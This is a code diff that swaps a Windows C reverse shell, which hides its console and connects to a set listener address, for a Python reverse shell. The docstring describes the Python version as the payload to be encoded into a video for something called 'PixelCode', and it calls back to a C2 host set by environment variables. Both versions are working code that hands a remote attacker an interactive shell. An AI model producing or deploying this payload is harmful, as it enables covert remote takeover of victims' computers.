@@ -1,39 +1,37 @@
-#include <windows.h>
-#include <stdio.h>
+#!/usr/bin/env python3
+"""
+Reverse Shell payload for PixelCode
+This is the actual payload that gets encoded into the video
+"""
 
-int main() {
-    WSADATA wsaData;
-    SOCKET sock;
-    struct sockaddr_in server;
-    STARTUPINFO si;
-    PROCESS_INFORMATION pi;
+import socket
+import subprocess
+import os
+import sys
+import threading
+
+def reverse_shell(host="192.168.1.100", port=4444):
+    """Simple reverse shell implementation"""
+    try:
+        # Create socket
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, port))
+        
+        # Redirect stdin/stdout/stderr to socket
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+        
+        # Start interactive shell
+        subprocess.call(["/bin/sh" if os.name != "nt" else "cmd.exe"])
+        
+    except Exception as e:
+        print(f"Error: {e}")
+        sys.exit(1)
+
+if __name__ == "__main__":
+    # You can change these or get from environment
+    host = os.environ.get("C2_HOST", "192.168.1.100")
+    port = int(os.environ.get("C2_PORT", "4444"))
     
-    // Hide console window
-    ShowWindow(GetConsoleWindow(), SW_HIDE);
-    
-    // Initialize Winsock
-    WSAStartup(MAKEWORD(2,2), &wsaData);
-    
-    // Create socket
-    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
-    
-    // Configure connection to your listener
-    server.sin_family = AF_INET;
-    server.sin_port = htons(8081);  // Your LPORT
-    server.sin_addr.s_addr = inet_addr("10.10.110.106");  // Your LHOST
-    
-    // Connect back
-    WSAConnect(sock, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL);
-    
-    // Redirect stdin/stdout/stderr to socket
-    memset(&si, 0, sizeof(si));
-    si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESTDHANDLES;
-    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
-    
-    // Spawn cmd.exe with redirected handles
-    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
-    
-    WaitForSingleObject(pi.hProcess, INFINITE);
-    return 0;
-}
+    reverse_shell(host, port)
